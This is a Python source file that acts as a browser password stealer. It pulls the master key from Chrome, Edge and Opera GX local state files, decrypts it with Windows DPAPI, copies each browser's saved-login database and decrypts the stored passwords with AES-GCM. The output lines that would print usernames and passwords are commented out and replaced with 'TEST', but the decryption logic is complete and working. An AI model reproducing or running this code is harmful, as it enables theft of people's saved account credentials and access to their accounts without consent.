import os
import json
import base64
import sqlite3
import win32crypt
import shutil
from Crypto.Cipher import AES
from datetime import datetime, timedelta


def get_chrome_datetime(chromedate):
	return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key(browser):
	if browser == "chrome":
		local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
										"Local State")
	elif browser == "edge":
		local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
										"Local State")
	elif browser == "operagx":
		local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software",
										"Opera GX Stable", "Local State")
	else:
		raise ValueError("Unsupported browser")

	with open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)
		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		key = key[5:]
		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
	try:
		iv = password[3:15]
		password = password[15:]
		cipher = AES.new(key, AES.MODE_GCM, iv)
		return cipher.decrypt(password)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			return ""


def fetch_browser_passwords():
	result = ""
	browsers = ["chrome", "edge", "operagx"]

	for browser in browsers:
		result += f"\npasswords from {browser.capitalize()}:\n"

		key = get_encryption_key(browser)

		if browser == "chrome":
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
								   "default", "Login Data")
		elif browser == "edge":
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
								   "Default", "Login Data")
		elif browser == "operagx":
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable",
								   "Login Data")
		else:
			raise ValueError("Unsupported browser")

		if not os.path.isfile(db_path):
			print(f"Файл базы данных для {browser} не найден.")
			return

		filename = f"{browser}_data.db"
		shutil.copyfile(db_path, filename)
		db = sqlite3.connect(filename)
		cursor = db.cursor()
		cursor.execute(
			"SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

		for row in cursor.fetchall():
			origin_url = row[0]
			action_url = row[1]
			username = row[2]
			password = decrypt_password(row[3], key)
			date_created = row[4]
			date_last_used = row[5]

			if username or password:
				result += f"Origin URL: {origin_url}\n"
				result += f"Action URL: {action_url}\n"
				#result += f"Username: {username}\n"
				result += f"Username: TEST\n"
				#result += f"Password: {password}\n"
				result += f"Password: TEST\n"

			if date_created != 86400000000 and date_created:
				result += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
			if date_last_used != 86400000000 and date_last_used:
				result += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"

			result += "=" * 50 + "\n"

		cursor.close()
		db.close()

		try:
			os.remove(filename)
		except:
			pass

	return result